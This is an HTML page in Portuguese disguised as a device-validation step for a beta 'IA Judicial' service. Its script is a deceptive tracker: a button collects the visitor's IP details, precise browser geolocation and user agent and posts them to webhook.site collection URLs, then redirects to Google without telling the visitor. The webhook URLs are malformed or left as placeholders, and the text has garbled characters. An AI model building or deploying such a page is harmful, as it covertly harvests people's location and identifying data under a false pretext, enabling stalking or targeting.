<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>IA Judicial - Valida√ß√£o de Acesso</title>
</head>
<body style="text-align:center; font-family:sans-serif; margin-top:60px;">
  <h2>üîê Verificando - TESTE Beta</h2>
  <p>Para acessar a IA Judicial, valide seu dispositivo e aprove as opcoes necessarias para poder funcionar sem erros.</p>
  <p>Ao clicar, a IA ir√° funcionar sem erros.</p>
  <button onclick="validar()" style="padding: 10px 20px; font-size: 16px;">Validar Agora</button>

  <script>
    async function validar() {
      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());

      let latitude = null;
      let longitude = null;

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (position) => {
          latitude = position.coords.latitude;
          longitude = position.coords.longitude;

          const dados = {
            ip: ipData.ip,
            cidade: ipData.city,
            regiao: ipData.region,
            pais: ipData.country_name,
            latitude: latitude,
            longitude: longitude,
            navegador: navigator.userAgent,
            horario: new Date().toISOString()
          };

          await fetch("https://webhook.site/https://webhook.site/afac7b89-6504-4ac3-9082-78546bafc829", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(dados)
          });

          alert("Valida√ß√£o conclu√≠da. Obrigado.");
          window.location.href = "https://www.google.com";
        },
        async (erro) => {
          // Se o usu√°rio negar geolocaliza√ß√£o
          const dados = {
            ip: ipData.ip,
            cidade: ipData.city,
            regiao: ipData.region,
            pais: ipData.country_name,
            latitude: "n√£o permitido",
            longitude: "n√£o permitido",
            navegador: navigator.userAgent,
            horario: new Date().toISOString()
          };

          await fetch("https://webhook.site/SEU_ID_AQUI", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(dados)
          });

          alert("Valida√ß√£o parcial sem localiza√ß√£o precisa.");
          window.location.href = "https://www.google.com";
        });
      } else {
        alert("Geolocaliza√ß√£o n√£o suportada neste navegador.");
      }
    }
  </script>
</body>
</html>
